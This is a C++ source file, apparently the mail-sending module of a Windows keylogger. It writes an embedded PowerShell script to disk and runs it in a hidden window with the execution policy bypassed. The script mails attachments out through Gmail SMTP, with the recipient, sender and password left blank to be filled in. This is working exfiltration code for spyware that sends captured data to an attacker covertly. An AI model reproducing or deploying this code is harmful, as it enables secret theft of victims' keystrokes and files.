#include <fstream>
#include <vector>
#include <Windows.h>
#include "Input_Output.h"
#include "Timer.h"

using namespace std;
#define MAIL_SCRIPT_NAME "Mail_Send_Script.ps1"

namespace Mailer
{
#define MAIL_TO "" //Fill in Recipient Mail Id
#define MAIL_FROM "" //Fill in Sender Mail Id
#define MAIL_PASS "" //Fill in Sender mail  Password

    const string &PowerShellScript =
        "Param( \r\n   [String]$Attach_Main,\r\n   [String]$Subject_Main,\r\n   "
        "[String]$Body_Main\r\n)\r\n\r\nFunction Send-Mail"
        " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
        "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
        "[String]$From,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
        "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
        "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
        "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
        "[String]$Attachments\r\n    )\r\n    try\r\n        {\r\n            $Message = New-Object "
        "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Server = \"smtp.gmail.com\" "
        "\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
        "                        $Attachments_1 = $Attachments -split (\"\\:\\:\");\r\n                      "
        "  ForEach ($val in $Attachments_1)\r\n                    "
        "        {\r\n               "
        "                 $attach = New-Object System.Net.Mail.Attachment($val)\r\n                       "
        "         $Message.Attachments.Add($attach)\r\n                            }\r\n                    "
        "}\r\n                catch\r\n                    {\r\n                        exit 2; "
        "\r\n                    }\r\n            }\r\n "
        "           $client = New-Object System.Net.Mail.SmtpClient($Server, 587) #587 port for smtp.gmail.com SSL\r\n "
        "           $client.EnableSsl = $true \r\n            $client.Credentials = New-Object "
        "System.Net.NetworkCredential($From, $Password); \r\n            $client.Send($Message)\r\n "
        "           Remove-Variable -Name client\r\n            Remove-Variable -Name Password\r\n            "
        "exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
        "  \r\n          }\r\n} #End Function Send-Mail\r\ntry\r\n    {\r\n        "
        "Send-Mail -Attachments $Attach_Main "
        "-To \"" + (string)MAIL_TO +
        "\""
        " -Body $Body_Main -Subject $Subject_Main "
        "-Password \"" +
        (string)MAIL_PASS +
        "\""
        " -From \"" +
        (string)MAIL_FROM +
        "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

#undef MAIL_TO 
#undef MAIL_FROM
#undef MAIL_PASS

    string Replace(string str, const string pattern_search, const string pattern_replace)
    {
        if (pattern_search.empty())
            return str;
        size_t pos = 0;
        
        while ((pos = str.find(pattern_search)) != string::npos)
        {
            str.replace(pos, pattern_search.length(), pattern_replace), pos += pattern_replace.length();
        }
        return str;
    }

    bool CheckFileExists(const string &f)
    {
        ifstream file(f);
        return (bool)file;
    }

    bool deleteFile(const string& f)
    {
        int removestat = remove(f.c_str());
        if (removestat == ERROR_SUCCESS || removestat == ERROR_FILE_NOT_FOUND)
            return true;
        else
            return false;
    }

    bool CreateScript()
    {
        ofstream script(Input_Output::GetPath(true) + string(MAIL_SCRIPT_NAME));

        if (!script)
            return false;
        
        script << PowerShellScript;

        if (!script)
            return false;

        script.close();
        KeyLogger::InfoLogger("Script for mailing created");
        return true;
    }

    Timer mail_timer;

    int SendMail(const string& subject, const string& body, const string& attachments)
    {
        bool ok;

        ok = Input_Output::MakeDirectoryNeeded(Input_Output::GetPath(true));
        if (!ok)
            return (-1);

        string script_path = Input_Output::GetPath(true) + string(MAIL_SCRIPT_NAME);
        
        ok = CreateScript();
        
        if (!ok)
        {
            KeyLogger::ErrorLogger("Unable to create mailer script");
            return -2;
        }

        string param = "-ExecutionPolicy ByPass -File \"" + script_path + "\" -Subj \"" + Replace(subject, "\"", "\\\"") + "\" -Body \"" + Replace(body, "\"", "\\\"") + "\" -Att \"" + attachments + "\"" ;

        SHELLEXECUTEINFO ShExecInfo = { 0 };
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.hwnd = NULL;
        ShExecInfo.lpVerb = "open";
        ShExecInfo.lpFile = "powershell";
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.nShow = SW_HIDE;
        ShExecInfo.hInstApp = NULL;

        ok = (bool)ShellExecuteEx(&ShExecInfo);
        if (!ok)
            return -3;
        // Wait to see if mail was successfully sent
        WaitForSingleObject(ShExecInfo.hProcess, 8000);
        DWORD exitcode = 100; //arbitrary code to exit
        GetExitCodeProcess(ShExecInfo.hProcess, &exitcode);

        mail_timer.SetFunction([&]()
            {
                WaitForSingleObject(ShExecInfo.hProcess, 60000); //Waiting for 1 minute
                GetExitCodeProcess(ShExecInfo.hProcess, &exitcode);
                if ((int)exitcode == STILL_ACTIVE)
                    TerminateProcess(ShExecInfo.hProcess, 100);
                KeyLogger::InfoLogger("<From SendMail> Return Code : " + KeyLogger::ToString((int)exitcode));
                /*KeyLogger::InfoLogger("Going to delete script");
                if (deleteFile(script_path))
                    KeyLogger::InfoLogger("Successfully deleted created script file");
                else
                    KeyLogger::ErrorLogger("Unable to delete file at : " + script_path);*/
            }
        );

        mail_timer.CountRepeat(1L);
        mail_timer.SetInterval(10L);
        mail_timer.Timer_Start(true);

        return (int)exitcode;
    }

    int SendMail(const string &subject, const string &body, const vector<string>& att) //Overloading to send multiple attachments
    {
        string attachments = "";
        if (att.size() == 1U)
            attachments = att.at(0);
        else
        {
            for (const auto& v : att)
                attachments += v + "::";
            attachments = attachments.substr(0, attachments.length() - 2);
        }
        return SendMail(subject, body, attachments);
    }
}